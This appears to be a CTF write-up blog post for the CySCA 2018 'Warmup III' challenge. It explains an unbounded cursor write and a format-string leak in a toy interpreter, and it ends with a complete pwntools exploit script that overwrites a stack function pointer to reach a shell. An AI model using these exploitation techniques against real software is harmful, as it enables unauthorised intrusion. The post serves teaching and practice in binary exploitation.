---
layout: post
title: CySCA 2018 | Warmup III Writeup
author: adamt
---

Another interesting challenge from the CySCA 2018 team.


This challenge included reverse engineering a unique command sequence, and then hijacking the logic of the program to leak memory addresses and eventually get shell.

The commands
-----------------------------------------

The program/shell was at its most basic level, a text editor in which you could move a cursor around and incremenet/decrement the value at a specific location & view the value at the cursor

The program/shell had 6 useful commands you could enter
<br />
The cursor by default is in the beginning of the buffer, the buffer is NULLed out memory.
<br />

* '+'   =>    Increment the value at the cursor
* '-'   =>    Decrement the value at the cursor
* 'd'   =>    Print the byte value at the cursor
* 'p'   =>    Set the buffer as the first argument to printf (printf is stored on the stack at address $rbp - 0x14)
* '>'   =>    Increment the cursor
* '<'   =>    Decrement the cursor

There are no checks done on the width/size of the buffer. The buffer is of 0x400 size stored at $rbp - 0x420. 

The Vulnerability
-------------------------------------------------

Firstly since there are no checks done on the boundary of the buffer, we are able to move the cursor to any arbritary location on the stack by incrementing/decrementing it. This coupled with the fact that we can write bytes to the cursor via the '+'/'-' commands allow for an arbritary write primitive to any address on the stack.

There is also a format string vulnerability via the 'p' command, as this treats the (user-controlled) buffer as the format argument to printf. This, paired with the arbritary write from above, allows us to leak values quickly off the stack.


The Exploit
-----------------------------------------------------

We first notice there is a `win` function include in the binary. This is our goal.
Also notice that the address of printf is stored on the stack, and so overriding this address, will result in arbritrary code execution.
<br />

```python
~/ctfs/cysca2018/binary   
❯ checksec chal3 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
Notice that PiE is enabled. This means that in order find the address of `win` we need a leak.
Luckily we learnt earlier we have a format string vuln, so we write `%n$p` to the stack and chuck that in a loop to leak a few addresses.
<br />

We can do this by Incrementing each byte of the buffer to the correct ascii value, and then sending the print command

```
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++>>p
```

Would print `ABC`, since we incrementing the first byte 0x41 times, then moved the cursor along... and so on.




After leaking stack addresses I noticed that `%136$p` leaked the address of \_start of the binary. This is -0x110 offset from the win function. Great! Now we have an address to jump to..
<br />

Next we just need to somehow overwrite the function pointer on the stack. Thats where our arbritrary write comes in (This could also be done with the format string from earlier). The function pointer is 0x408 bytes away from the start of the buffer. So moving the cursor 0x408 will place us right over the function pointer, allowing us to overwrite it. Yay!!!


Final Script:

```python
from pwn import *

p = process("./chal3") #remote("10.13.37.33", 10003)
INC = '+'
DEC = '-'
HPRINT = 'd'
PRINT = 'p'
NEXT = '>'
PREV = '<'
WIN = -0x110

# Write a value to the buffer.
# print the value
# Reset the buffer to all NULL's
def create_string(s):
    ret = ''
    for c in s:
        ret += ord(c) * INC # Write the character to the cursor
        ret += NEXT # Increment the cursor 
    ret += PRINT # Print the buffer

    for c in s[::-1]:
        ret += PREV # Decrement the cursor
        ret += ord(c) * DEC # Set the value at the cursor to 0
    return ret

def send(s):     
    a = create_string(s+'\n') + PRINT
    p.sendline(a)


def goforward(n):
    p.sendline(NEXT * n)

send("%136$p")
leak = int(p.recvline().strip()[2:], 16)
win_address = leak + WIN

goforward(0x408) # move the cursor over the pointer

for i in range(0, 8): # Write win_address to the printf address on the stack
    p.sendline(HPRINT) # Leak 1 byte of the address
    num = int(p.recvline(), 16)
    p.sendline(DEC * num)  # Set the byte to 0
    
    num = win_address & 0xFF # Calculate the next byte to write 
    win_address >>= 8
    
    p.sendline(INC * num) # Set the byte to the correct value
    p.sendline(NEXT)


p.sendline(PRINT) # Call the win function
p.interactive()
```




